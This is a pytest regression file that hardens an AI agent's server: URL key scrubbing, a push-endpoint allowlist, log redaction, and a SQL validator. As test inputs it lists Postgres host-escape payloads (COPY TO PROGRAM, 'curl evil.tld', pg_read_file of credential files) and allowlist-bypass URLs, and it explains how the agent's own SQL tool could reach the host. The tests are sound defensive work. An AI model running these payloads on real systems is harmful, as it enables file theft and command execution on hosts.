"""§4DW round two — the pins three fresh-eye lenses proved were missing.

Round one shipped 61 pins and a 22/22 mutation score. An independent lens
then ran 23 mutants of its own and **13 survived**: every mutant round one
wrote DELETED a line, and every pin was written to catch deletion. The
survivors all live in the other half of the space — a meaning changed while
the tokens stay put.

Two further lenses found live defects the pins could not have caught because
the code was wrong in ways round one never modelled: a host-validation
bypass, a lazy `urlsplit` attribute that raised outside its `try`, a
percent-encoded parameter name that authenticates but matches no guard, and
a SQL validator that blocks `DROP TABLE` while passing `COPY … TO PROGRAM`.

Each test below names the world in which it fails.
"""
import json
import logging
import os
import re
import subprocess
import sys
import types
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
os.environ.setdefault("GHOST_API_KEY", "test-ghost-key")

from fastapi.testclient import TestClient  # noqa: E402

NODE = "/opt/homebrew/bin/node"


@pytest.fixture(scope="module")
def iface():
    import interface.server as server
    return server


# ══ 1. the URL scrub, EXECUTED ════════════════════════════════════════════

def _run_scrub(href):
    """Run the real `URL_KEY_SCRUB_SCRIPT` in a JS engine against `href`.

    Returns the URL the page would replace the history entry with, or None
    when the scrub did not fire.
    """
    import interface.server as server
    body = (server.URL_KEY_SCRUB_SCRIPT
            .replace("<script>", "").replace("</script>", "").strip())
    driver = """
const body = process.argv[1], href = process.argv[2];
let replaced = null;
const location = new URL(href);
const history = { replaceState: (a, b, url) => { replaced = url; } };
try { new Function('location','history','URL', body)(location, history, URL); }
catch (e) { console.log('THREW:' + e.message); process.exit(0); }
console.log(replaced === null ? 'NOSCRUB' : replaced);
"""
    out = subprocess.run([NODE, "-e", driver, "--", body, href],
                         capture_output=True, text=True)
    assert out.returncode == 0, out.stderr[-800:]
    res = out.stdout.strip()
    assert not res.startswith("THREW:"), res
    return None if res == "NOSCRUB" else res


@pytest.mark.skipif(not Path(NODE).exists(), reason="node not installed")
@pytest.mark.parametrize("href,expected", [
    ("https://h/?key=SECRET&tab=chat", "/?tab=chat"),
    # Starlette percent-DECODES parameter names, so these authenticate
    # exactly like `?key=` — and the old `location.search.includes("key=")`
    # guard was false for every one of them.
    ("https://h/?%6bey=SECRET&tab=chat", "/?tab=chat"),
    ("https://h/?ke%79=SECRET&tab=chat", "/?tab=chat"),
    ("https://h/p?key=S&tab=x#frag", "/p?tab=x#frag"),
    ("https://h/?key=A&key=B", "/"),
])
def test_url_scrub_actually_removes_the_key_in_a_js_engine(href, expected):
    """⚠ THE ONLY NON-TAUTOLOGICAL PIN ON THIS PROPERTY.

    Every string-level assertion compares the constant to a page built from
    that same constant, so both sides move together. Two mutants that fully
    neuter the scrub — `history.replaceState(null,"",location.href)` (the
    deletion applied to a discarded object) and `if(false&&…)` — keep every
    token, every brace and every required substring, and passed the entire
    round-one file. Running it is the only thing that can tell the
    difference.
    """
    assert _run_scrub(href) == expected


@pytest.mark.skipif(not Path(NODE).exists(), reason="node not installed")
def test_url_scrub_does_not_fire_without_a_key():
    """The counterweight: an unkeyed URL must be left exactly alone, or
    every navigation rewrites history for nothing."""
    assert _run_scrub("https://h/?tab=chat") is None


# ══ 2. the page survives a reload (the scrub's own side effect) ═══════════

def test_reload_without_the_key_still_serves_the_page(iface):
    """⚠ THE REGRESSION THE SCRUB CAUSED.

    Taking `?key=` out of the address bar also removed the only thing that
    made the page re-openable: Cmd-R, session-restore, "reopen closed tab"
    and the service worker's `clients.openWindow("/")` all became 401 — and
    an installed iOS PWA has no address bar to fix it in. Fails if the page
    cookie is dropped.
    """
    c = TestClient(iface.app)
    assert c.get(f"/?key={iface.GHOST_API_KEY}").status_code == 200
    assert c.get("/").status_code == 200, "a reload lands on 401"


def test_a_fresh_browser_still_needs_the_key(iface):
    """The counterweight: the cookie must not make the page public."""
    assert TestClient(iface.app).get("/").status_code == 401


def test_a_forged_cookie_is_rejected(iface):
    """The cookie is compared with the same constant-time check as the query
    parameter — it is not a bearer token the client can invent."""
    c = TestClient(iface.app)
    c.cookies.set(iface._PAGE_COOKIE, "not-the-key")
    assert c.get("/").status_code == 401


def test_page_cookie_is_httponly_and_samesite_strict(iface):
    """It carries the master key, so JS must not be able to read it and it
    must never ride a cross-site request."""
    r = TestClient(iface.app).get(f"/?key={iface.GHOST_API_KEY}")
    sc = r.headers.get("set-cookie", "").lower()
    assert "httponly" in sc
    assert "samesite=strict" in sc


def test_page_cookie_is_secure_only_over_https(iface):
    """`Secure` over plain HTTP would silently drop the cookie and bring the
    401-on-reload bug straight back on the local loopback path; omitting it
    over TLS would leak the key to a plaintext hop. It follows the scheme."""
    over_http = TestClient(iface.app).get(
        f"/?key={iface.GHOST_API_KEY}").headers.get("set-cookie", "").lower()
    over_https = TestClient(iface.app, base_url="https://h").get(
        f"/?key={iface.GHOST_API_KEY}").headers.get("set-cookie", "").lower()
    assert "secure" not in over_http
    assert "secure" in over_https
    behind_proxy = TestClient(iface.app).get(
        f"/?key={iface.GHOST_API_KEY}",
        headers={"X-Forwarded-Proto": "https"}
    ).headers.get("set-cookie", "").lower()
    assert "secure" in behind_proxy


def test_push_payloads_do_not_carry_the_key(iface):
    """A Web Push payload is encrypted to the SUBSCRIPTION's keys, which the
    client supplies — so a planted subscription could decrypt anything put
    in it. The click URL used to be `/?key=<master key>`."""
    assert iface._PUSH_CLICK_URL == "/"
    src = (_ROOT / "interface" / "server.py").read_text(encoding="utf-8")
    assert 'url=f"/?key=' not in src


# ══ 3. the push allowlist: the bypasses, and the boundaries ══════════════

def _allowed(url):
    from interface import webpush_notify
    return webpush_notify._push_endpoint_allowed(url)


def test_backslash_authority_is_rejected():
    """⚠ A LIVE BYPASS OF THE ROUND-ONE GUARD.

    `urlsplit` and `requests` disagree about where the authority ends when
    it contains a backslash:
        urlsplit(...).hostname -> 'evil.tld\\\\.web.push.apple.com'  (allowed!)
        requests               -> https://evil.tld/%5C.web.push...  (POSTs to evil.tld)
    The suffix check passed on a string that is not the host the request
    goes to. Fails if the hostname-shape check is removed.
    """
    assert not _allowed("https://evil.tld\\.web.push.apple.com/x")


def test_out_of_range_port_returns_false_and_does_not_raise():
    """⚠ `urlsplit` IS LAZY. It does not parse the port until `.port` is
    read, and an out-of-range port raises ValueError THERE. With that access
    outside the `try`, one stored row like this aborted the whole of
    `broadcast()` before any device was reached — the guard meant to contain
    a poisoned row instead silenced every push."""
    assert _allowed("https://web.push.apple.com:99999/x") is False


def test_broadcast_survives_a_poisoned_row_and_still_reaches_the_others(
        tmp_path, monkeypatch):
    """The behavioural half of the test above, from the consumer's side."""
    from interface import webpush_notify as w
    keys = {"p256dh": "p", "auth": "a"}
    good = "https://web.push.apple.com/ok"
    poisoned = "https://web.push.apple.com:99999/x"
    f = tmp_path / "subs.json"
    f.write_text(json.dumps({poisoned: {"endpoint": poisoned, "keys": keys},
                             good: {"endpoint": good, "keys": keys}}))
    monkeypatch.setattr(w, "_SUBS_FILE", f)
    monkeypatch.setattr(w, "vapid_config", lambda: {
        "private_key_pem": "x", "public_key_b64url": "y", "sub": "mailto:t@t"})
    monkeypatch.setattr(w, "_vapid_key_object", lambda: object())
    sent = []
    fake = types.ModuleType("pywebpush")
    fake.WebPushException = type("WebPushException", (Exception,), {})
    fake.webpush = lambda **kw: sent.append(kw["subscription_info"]["endpoint"])
    monkeypatch.setitem(sys.modules, "pywebpush", fake)
    w.broadcast("t", "b")
    assert sent == [good]


@pytest.mark.parametrize("url", [
    "https://xweb.push.apple.com/x",       # no dot boundary
    "https://evilfcm.googleapis.com/x",    # no dot boundary
    "https://evil.tld@web.push.apple.com/x",  # userinfo — THIS direction
])
def test_near_miss_hosts_are_rejected(url):
    """Round one's hostile corpus only had `web.push.apple.com.evil.tld`,
    which the suffix check catches on its own — so dropping the dot from the
    boundary, and dropping the userinfo clause entirely, both survived. The
    userinfo case is specifically the reverse spelling: with the allowed
    host AFTER the `@`, `hostname` is the allowed one and only the username
    check rejects it."""
    assert not _allowed(url)


def test_allowlist_entries_cannot_name_a_bare_tld():
    """⚠ A ONE-WORD EDIT RESTORES THE SSRF. Appending `"com"` to
    `_PUSH_HOST_SUFFIXES` turns the allowlist into "any .com host" and no
    host-matching test notices, because every hostile fixture uses a
    made-up TLD. The table now asserts its own shape at import; this pins
    that the assertion is real by checking the property it enforces."""
    from interface import webpush_notify as w
    for sfx in w._PUSH_HOST_SUFFIXES:
        assert len(sfx.split(".")) >= 3, sfx
    assert not _allowed("https://attacker.com/pwn")


def test_a_valid_host_with_no_crypto_keys_is_still_refused(tmp_path,
                                                           monkeypatch):
    """⚠ COVERAGE THE ALLOWLIST ITSELF DESTROYED. The pre-existing
    `test_malformed_rejected` probed `{"endpoint": "https://ok", "keys": {}}`,
    which used to pass `startswith("https://")` and reach the p256dh/auth
    branch. The new host check short-circuits first, so that branch became
    unreachable from any test and could be deleted unnoticed. This probes it
    through a host the allowlist accepts."""
    from interface import webpush_notify as w
    monkeypatch.setattr(w, "_SUBS_FILE", tmp_path / "s.json")
    assert w.add_subscription(
        {"endpoint": "https://web.push.apple.com/x", "keys": {}}) is False
    assert w.add_subscription(
        {"endpoint": "https://web.push.apple.com/x",
         "keys": {"p256dh": "p"}}) is False
    assert w.add_subscription(
        {"endpoint": "https://web.push.apple.com/x",
         "keys": {"p256dh": "p", "auth": "a"}}) is True


# ══ 4. redaction: encodings, the key's own value, and three-way parity ════

_K = "K" * 64


@pytest.mark.parametrize("line", [
    f"/?key={_K}", f"/?%6bey={_K}", f"/?ke%79={_K}",
    f"/x?API-KEY={_K}", f"/x?%73ecret={_K}", f"/x?a=1&access_token={_K}",
])
def test_encoded_parameter_names_are_redacted(line):
    """⚠ Starlette DECODES parameter names, so `?%6bey=` authenticates
    exactly like `?key=` — while uvicorn logs the RAW spelling. A guard that
    reads the name differently from the router that honours it is not a
    guard. Fails if the rule goes back to spelling names literally."""
    from ghost_agent.distill.redact import redact_text
    out = redact_text(line)
    assert _K not in out, out


def test_the_master_key_is_redacted_by_value_in_any_spelling():
    """Every other rule is NAME-anchored (`GHOST_API_KEY=`, `"api_key":`,
    `?key=`). None recognised the secret itself, so a bare key, a
    `X-Ghost-Key:` header, a headers dict and a curl line all round-tripped
    it verbatim into whatever durable sink was writing. Fails if the
    value-sourced rule is removed."""
    from ghost_agent.distill import redact as R
    R._MASTER_KEY_CACHE["source"] = None          # force a re-read
    os.environ["GHOST_API_KEY"] = _K
    try:
        for shape in (_K, f"X-Ghost-Key: {_K}", f"x-ghost-key: {_K}",
                      f"curl -H 'X-Ghost-Key: {_K}' http://h/",
                      f"{{'x-ghost-key': '{_K}'}}", f"the key is {_K} ok"):
            assert _K not in R.redact_text(shape), shape
    finally:
        os.environ["GHOST_API_KEY"] = "test-ghost-key"
        R._MASTER_KEY_CACHE["source"] = None


def test_an_unrelated_sha256_is_not_redacted():
    """The counterweight, and the reason the rule is sourced from the VALUE
    rather than the shape: the key is 64 hex characters, indistinguishable
    from every SHA-256 in these logs. A `[0-9a-f]{64}` rule would redact
    file hashes, git objects and cache keys wholesale."""
    from ghost_agent.distill.redact import redact_text
    h = "abc123" + "0" * 58
    assert redact_text(f"blob {h} written") == f"blob {h} written"


def test_the_three_redactors_agree():
    """⚠ THREE COPIES, ONE BEHAVIOUR. The interface runs as a plain module
    and cannot import `ghost_agent`, so the query-scrubbing logic exists in
    three places. They had already drifted: the interface's covered only
    `key|token|api_key|secret`, so `password`, `apikey`, `access_token`,
    `auth` and `sig` were written verbatim to a 0644 log. Fails the moment
    any one of them is changed alone."""
    import interface.server as iface
    from ghost_agent.distill.redact import redact_text
    from ghost_agent.main import _RedactAccessLog

    agent_filter = _RedactAccessLog()

    def via_agent(s):
        rec = logging.LogRecord("u", 20, "", 0, "%s", (s,), None)
        agent_filter.filter(rec)
        return rec.getMessage()

    corpus = [f"/x?{name}={_K}" for name in
              ("key", "api_key", "apikey", "token", "access_token", "auth",
               "secret", "password", "sig", "session", "%6bey", "API-KEY")]
    corpus += ["/api/health", "?q=weather&lang=en", "monkey=banana"]
    for line in corpus:
        a, b, c = redact_text(line), iface._redact_qs(line), via_agent(line)
        assert b == c, f"interface vs agent disagree on {line!r}: {b!r} {c!r}"
        assert (_K in a) == (_K in b) == (_K in c), (
            f"leak disagreement on {line!r}")


@pytest.mark.parametrize("impl", ["agent", "interface"])
def test_access_filters_survive_dict_shaped_args(impl):
    """⚠ `logging` allows `log("%(path)s", {...})`, in which case
    `record.args` is a DICT. Iterating it yields its KEYS; reassigning those
    as a tuple makes the record raise `TypeError: format requires a mapping`
    at EMIT time — the line is lost entirely, and the filter's own
    `try/except` cannot help because the corruption happens before anything
    raises."""
    import interface.server as iface
    from ghost_agent.main import _RedactAccessLog
    filt = (_RedactAccessLog() if impl == "agent"
            else iface._RedactSecretsInAccessLog())
    rec = logging.LogRecord("u", 20, "", 0, "%(path)s ok",
                            ({"path": f"/x?token={_K}"},), None)
    filt.filter(rec)
    msg = rec.getMessage()          # must not raise
    assert _K not in msg
    assert "ok" in msg


def test_the_client_address_survives_the_access_filter():
    """⚠ AN ACCESS LOG WITHOUT THE ADDRESS IS WORTHLESS. The filter used to
    run the full `redact_text` over the args, whose first element is
    uvicorn's `client_addr` — so the only records worth reading, the
    non-loopback ones, had their source rewritten to `<REDACTED_IP>`
    (127.0.0.1 is exempt, which is why local traffic looked fine and hid
    it). This agent binds 0.0.0.0."""
    from ghost_agent.main import _RedactAccessLog
    rec = logging.LogRecord("uvicorn.access", 20, "", 0,
                            '%s - "%s %s HTTP/%s" %d',
                            ("100.93.181.31:54233", "GET", f"/?key={_K}",
                             "1.1", 200), None)
    _RedactAccessLog().filter(rec)
    out = rec.getMessage()
    assert "100.93.181.31" in out, f"client address was redacted: {out}"
    assert _K not in out


def test_an_ordinary_access_line_is_untouched():
    """The counterweight the round-one filter tests lacked entirely: a
    filter that redacted EVERYTHING would have passed all of them."""
    from ghost_agent.main import _RedactAccessLog
    rec = logging.LogRecord("uvicorn.access", 20, "", 0,
                            '%s - "%s %s HTTP/%s" %d',
                            ("10.1.2.3:5", "GET", "/api/health", "1.1", 200),
                            None)
    _RedactAccessLog().filter(rec)
    assert rec.getMessage() == '10.1.2.3:5 - "GET /api/health HTTP/1.1" 200'


def test_all_three_uvicorn_loggers_carry_the_filter():
    """`uvicorn.access` is where the request line goes, but `uvicorn.error`
    is where the WebSocket upgrade line goes — and that carried `?key=` too.
    Narrowing the tuple to just `uvicorn.access` was unpinned."""
    from ghost_agent.main import install_access_log_redaction, _RedactAccessLog
    install_access_log_redaction()
    for name in ("uvicorn.access", "uvicorn.error", "uvicorn"):
        lg = logging.getLogger(name)
        assert any(isinstance(f, _RedactAccessLog) for f in lg.filters), name


def test_the_record_msg_branch_is_live():
    """Some records carry the URL in `msg` with no args at all — uvicorn's
    WebSocket lines do. Deleting that branch was unpinned."""
    from ghost_agent.main import _RedactAccessLog
    rec = logging.LogRecord("u", 20, "", 0,
                            f'WebSocket /ws?key={_K} [accepted]', None, None)
    _RedactAccessLog().filter(rec)
    assert _K not in rec.getMessage()


# ══ 5. the whitespace key fails CLOSED ═══════════════════════════════════

def test_whitespace_key_refuses_to_start_on_a_public_bind():
    """⚠ BEHAVIOUR, NOT A BANNER.

    The first fix printed "treating it as an explicit --api-key '' (auth
    disabled)" and assigned to a LOCAL; the function returns None and the
    caller passes `args.api_key` unchanged, so nothing downstream ever saw
    it. The message announced the opposite of what happened, and the pin
    asserted the message. Plumbing the empty value through would have been
    worse than the bug — it really would disable auth on a public bind — so
    the whitespace case is refused outright, like an absent key.
    """
    from ghost_agent.main import enforce_api_key_policy
    with pytest.raises(SystemExit) as e:
        enforce_api_key_policy(" ", "0.0.0.0")
    assert e.value.code == 2


def test_whitespace_key_is_tolerated_on_loopback():
    """The counterweight: unreachable from the network, so a warning is the
    proportionate response — refusing here would respawn-loop a KeepAlive
    daemon over a local misconfiguration."""
    from ghost_agent.main import enforce_api_key_policy
    enforce_api_key_policy(" ", "127.0.0.1")        # must not raise


def test_an_empty_string_key_is_still_the_explicit_opt_out():
    """`--api-key ''` is a deliberate operator choice and must keep working;
    only WHITESPACE is the misconfiguration. Dropping `and api_key != ""`
    from the condition was unpinned."""
    from ghost_agent.main import enforce_api_key_policy
    enforce_api_key_policy("", "0.0.0.0")           # warns, does not raise


def _ctx_stub():
    """The shape `_build_resolved_config` reads off the context. Kept minimal
    on purpose: this test is about the env leg, not the context leg."""
    return types.SimpleNamespace(
        args=types.SimpleNamespace(api_key="x"),
        memory_dir=Path("/tmp"), sandbox_dir=Path("/tmp"))


def test_env_redaction_hides_the_value_not_just_the_name():
    """⚠ A FULL INVERSION SURVIVED THE ROUND-ONE PIN, which asserted
    `"_is_secret_env" in body`. Swapping the ternary's arms serves the
    master key in cleartext from `/api/health` and writes it to
    `last_config.json`, and the literal is still there."""
    from ghost_agent.main import _build_resolved_config, _is_secret_env
    os.environ["GHOST_TEST_FAKE_SECRET_KEY"] = "SUPERSECRETVALUE"
    os.environ["GHOST_TEST_FAKE_PLAIN"] = "plainvalue"
    try:
        cfg = _build_resolved_config(types.SimpleNamespace(api_key="x"),
                                     _ctx_stub())
        env = {k: v for k, v in cfg.items() if k.startswith("env.")}
        secret = [v for k, v in env.items() if _is_secret_env(k[4:])]
        assert secret, "no secret env var was classified"
        assert all(v == "<REDACTED>" for v in secret), secret
        plain = env.get("env.GHOST_TEST_FAKE_PLAIN")
        assert plain == "plainvalue", (
            f"non-secret value was redacted instead: {plain!r}")
    finally:
        os.environ.pop("GHOST_TEST_FAKE_SECRET_KEY", None)
        os.environ.pop("GHOST_TEST_FAKE_PLAIN", None)


# ══ 6. the body cap's unpinned corners ═══════════════════════════════════

def _drive(*, method="POST", path="/api/feedback", headers=None, chunks=(),
           inner=None):
    import asyncio
    from ghost_agent.api.body_limit import BodySizeLimitMiddleware
    queue = list(chunks)

    async def receive():
        if queue:
            body = queue.pop(0)
            return {"type": "http.request", "body": body,
                    "more_body": bool(queue)}
        return {"type": "http.request", "body": b"", "more_body": False}

    sent = []

    async def send(m):
        sent.append(m)

    async def default_inner(scope, rcv, snd):
        while True:
            if not (await rcv()).get("more_body"):
                break
        await snd({"type": "http.response.start", "status": 200, "headers": []})
        await snd({"type": "http.response.body", "body": b"ok"})

    app = BodySizeLimitMiddleware(inner or default_inner)
    err = None
    try:
        asyncio.run(app({"type": "http", "method": method, "path": path,
                         "headers": headers or []}, receive, send))
    except BaseException as e:                      # noqa: BLE001
        err = e
    starts = [m["status"] for m in sent if m["type"] == "http.response.start"]
    return starts, err


def test_a_body_of_exactly_the_cap_is_accepted():
    """The boundary in both directions. `declared > cap` -> `>=` was
    unpinned: there was no test at the cap at all, so an off-by-one that
    rejects a legitimate exactly-sized upload was invisible."""
    from ghost_agent.api.body_limit import max_json_bytes
    cap = max_json_bytes()
    starts, _ = _drive(headers=[(b"content-length", str(cap).encode())],
                       chunks=[b"x" * cap])
    assert starts == [200]


def test_one_byte_over_the_cap_is_rejected():
    from ghost_agent.api.body_limit import max_json_bytes
    cap = max_json_bytes()
    starts, _ = _drive(headers=[(b"content-length", str(cap + 1).encode())],
                       chunks=[b"x" * (cap + 1)])
    assert starts == [413]


def test_no_second_response_is_started_after_the_app_replied():
    """⚠ THE CORRUPT HALF-RESPONSE THE GUARD EXISTS TO PREVENT.

    When the app has already sent `http.response.start`, a 413 cannot be
    written — the bytes would be a second status line inside the first
    response. The middleware re-raises instead and lets the connection drop.
    Passing the raw `send` instead of `tracking_send` loses the flag; both
    round-one inner apps reply only AFTER their read loop, so the branch was
    unreachable and the mutant survived.
    """
    async def replies_then_overflows(scope, rcv, snd):
        await snd({"type": "http.response.start", "status": 200,
                   "headers": []})
        while True:
            if not (await rcv()).get("more_body"):
                break
        await snd({"type": "http.response.body", "body": b"late"})

    starts, err = _drive(headers=[], chunks=[b"y" * (1024 * 1024)] * 12,
                         inner=replies_then_overflows)
    assert starts == [200], f"a second response was started: {starts}"
    assert err is not None, "the overflow was swallowed instead of re-raised"


def test_cors_headers_still_decorate_a_413():
    """⚠ THE DOCUMENTED MIDDLEWARE ORDER, PINNED.

    Starlette applies middleware in reverse registration order, so adding
    the body cap BEFORE CORS keeps CORS outermost and its headers on the
    413. Swapping the two calls is a silent, invisible change: every body
    test still passes and the browser just stops seeing the error.
    """
    c = _agent_client()
    r = c.post("/api/feedback", content=b"x" * (11 * 1024 * 1024),
               headers={"X-Ghost-Key": "test-ghost-key",
                        "Content-Type": "application/json",
                        "Origin": "http://example.test"})
    assert r.status_code == 413
    assert r.headers.get("access-control-allow-origin") == "*", (
        "CORS is inside the body cap; the browser cannot read the 413")


def _agent_client():
    from ghost_agent.api.app import create_app
    app = create_app()
    args = types.SimpleNamespace(api_key="test-ghost-key")
    app.state.agent = types.SimpleNamespace(
        context=types.SimpleNamespace(args=args))
    app.state.args = args
    return TestClient(app, raise_server_exceptions=False)


@pytest.mark.parametrize("spelling", ["/api/upload", "/api/upload/",
                                      "//api/upload"])
def test_upload_cap_survives_path_spelling(spelling):
    """`UPLOAD_PATHS` is an exact-match set, so `/api/upload/` fell through
    to the 10 MB JSON cap and 413'd a legitimate upload — measured against a
    live server. Starlette would have redirected it to the real route; the
    middleware runs first and never got there."""
    from ghost_agent.api.body_limit import cap_for_path, max_json_bytes
    assert cap_for_path(spelling) > max_json_bytes()


def test_normalisation_does_not_hand_a_json_route_the_upload_cap():
    """The counterweight: a normaliser more permissive than the router's
    would let a JSON route claim the 100 MB ceiling."""
    from ghost_agent.api.body_limit import cap_for_path, max_json_bytes
    for spelling in ("/api/./upload", "/api/feedback", "/api/upload/../x",
                     "/api/uploadx"):
        assert cap_for_path(spelling) == max_json_bytes(), spelling


# ══ 7. the SQL validator: a host escape it used to pass ══════════════════

@pytest.mark.parametrize("stmt", [
    "SELECT length(pg_read_file('/Users/vasilis/Data/AI/.ghost_api_key'))",
    "SELECT pg_read_binary_file('/etc/hosts')",
    "SELECT pg_ls_dir('/Users/vasilis/Data/AI')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1, '/tmp/x')",
    "COPY t FROM '/Users/vasilis/Data/AI/.ghost_api_key'",
    "COPY t TO '/tmp/dump.csv'",
    "COPY (SELECT 1) TO PROGRAM 'id > /tmp/x'",
    "COPY t FROM PROGRAM 'curl evil.tld'",
    "select PG_READ_FILE('/etc/passwd')",
    "SELECT 1; COPY (SELECT 1) TO PROGRAM 'id'",
])
def test_sql_host_escapes_are_refused_even_with_confirm(stmt):
    """⚠ THE MODEL'S OWN TOOL, OUTSIDE EVERY SANDBOX.

    `postgres_admin` runs in the agent process on the host. The `ghost` role
    is a Postgres SUPERUSER and `pg_hba.conf` grants `trust` on loopback, so
    these built-ins are the whole filesystem and a shell — reading the 0600
    master key and executing host commands were both demonstrated
    end-to-end. Every one of them validated CLEAN: the guard stopped
    `DROP TABLE`, the clumsy destructive thing, and passed the complete
    escape.

    `confirm=True` is passed deliberately. Unlike DROP/TRUNCATE this is not
    a confirmable operation — `confirm` exists so a deliberate destructive
    DDL can proceed, not so file reads and command execution can be opted
    into.
    """
    from ghost_agent.tools.validators import validate_sql
    ok, reason = validate_sql(stmt, confirm=True)
    assert not ok, f"host escape validated clean: {stmt}"
    assert reason


@pytest.mark.parametrize("stmt", [
    "SELECT 1",
    "SELECT * FROM tasks WHERE id = 3",
    "COPY tasks FROM STDIN",
    "COPY (SELECT x FROM t WHERE y = 1) TO STDOUT",
    "INSERT INTO t (note) VALUES ('copy from program is just text')",
    "SELECT * FROM logs WHERE msg = 'pg_read_file'",
    "UPDATE t SET x = 1 WHERE id = 2",
    "CREATE TABLE t (id int)",
])
def test_ordinary_sql_still_validates(stmt):
    """The counterweight, and the reason COPY is an ALLOW-list rather than a
    deny-list: `_mask_sql` blanks string literals before any guard runs, so
    `COPY t FROM '/etc/passwd'` arrives as `COPY t FROM` plus spaces. There
    is no path left to match — but `STDIN`/`STDOUT` are bare keywords that
    survive masking, so naming the safe forms catches every file path
    without needing to see it. A deny-list on `from\\s+'` passed the escape.
    """
    from ghost_agent.tools.validators import validate_sql
    ok, reason = validate_sql(stmt)
    assert ok, f"legitimate SQL refused: {stmt} -> {reason}"


# ══ 8. pins for guards whose ABSENCE is otherwise invisible ══════════════
#
# Four mutants survived the round-two batch. Each neuters a guard while
# leaving the data it guards correct, so nothing downstream changes — the
# classic shape of an unpinnable check. Each is pinned here by executing the
# guard against input that SHOULD trip it.

def test_the_suffix_table_guard_actually_rejects_a_bare_tld():
    """`assert all(len(s.split('.')) >= 3 ...)` cannot be pinned: neutering
    it leaves the real table valid, so every host test still passes. Made a
    function so the guard itself can be run against a bad table."""
    from interface.webpush_notify import (_validate_suffix_table,
                                          _PUSH_HOST_SUFFIXES)
    _validate_suffix_table(_PUSH_HOST_SUFFIXES)          # the real one passes
    for bad in (("com",), ("web.push.apple.com", "com"), ("tld",),
                ("googleapis.com",)):
        with pytest.raises(ValueError):
            _validate_suffix_table(bad)


def test_the_master_key_rule_refuses_a_too_short_secret():
    """⚠ THE OVER-REDACTION FAILURE MODE. The value rule redacts its source
    string wherever it appears; with the minimum length dropped, a one- or
    two-character key turns `redact_text` into a censor that rewrites
    ordinary prose. Nothing else in the suite would notice, because every
    other test uses a 64-character key."""
    from ghost_agent.distill import redact as R
    prev = os.environ.get("GHOST_API_KEY")
    R._MASTER_KEY_CACHE["source"] = None
    try:
        os.environ["GHOST_API_KEY"] = "e"
        assert R._master_key_rule() is None, (
            "a 1-character key became a redaction rule")
        sentence = "the server serves seven separate services"
        assert R.redact_text(sentence) == sentence
        R._MASTER_KEY_CACHE["source"] = None
        os.environ["GHOST_API_KEY"] = "x" * 15          # still under the floor
        assert R._master_key_rule() is None
        R._MASTER_KEY_CACHE["source"] = None
        os.environ["GHOST_API_KEY"] = "y" * 16          # at the floor
        assert R._master_key_rule() is not None
    finally:
        if prev is None:
            os.environ.pop("GHOST_API_KEY", None)
        else:
            os.environ["GHOST_API_KEY"] = prev
        R._MASTER_KEY_CACHE["source"] = None


def test_authenticated_docs_are_a_404_not_an_upstream_proxy():
    """⚠ `docs_url=None` does NOT produce a 404 here. `router` ends in a
    `/{path:path}` catch-all PROXY, so an authenticated operator asking for
    `/docs` got whatever llama-server answered. Checking only the
    unauthenticated status (401/403) cannot see this: the anonymous case is
    identical either way."""
    c = _agent_client()
    for path in ("/docs", "/redoc"):
        r = c.get(path, headers={"X-Ghost-Key": "test-ghost-key"})
        assert r.status_code == 404, (
            f"{path} -> {r.status_code}: the request reached the upstream "
            "proxy instead of being answered here")
        assert "openapi.json" in r.text


@pytest.mark.parametrize("name,secret", [
    ("GHOST_NOTIFY_WEBHOOK", True),      # a webhook URL is a bearer capability
    ("SLACK_WEBHOOK_URL", True),
    ("GHOST_DB_PASSPHRASE", True),
    ("GHOST_API_KEY", True),
    ("GHOST_HOME", False),
    ("GHOST_MAX_CONTEXT", False),
])
def test_secret_env_classification_covers_bearer_capabilities(name, secret):
    """Narrowing the marker tuple back to KEY/TOKEN/SECRET/… survived every
    round-one and round-two test, because they all probe names containing
    `KEY`. A webhook URL is a credential: anyone holding it can post as the
    integration, and it would go verbatim into `/api/health` and
    `last_config.json`."""
    from ghost_agent.main import _is_secret_env
    assert _is_secret_env(name) is secret, name
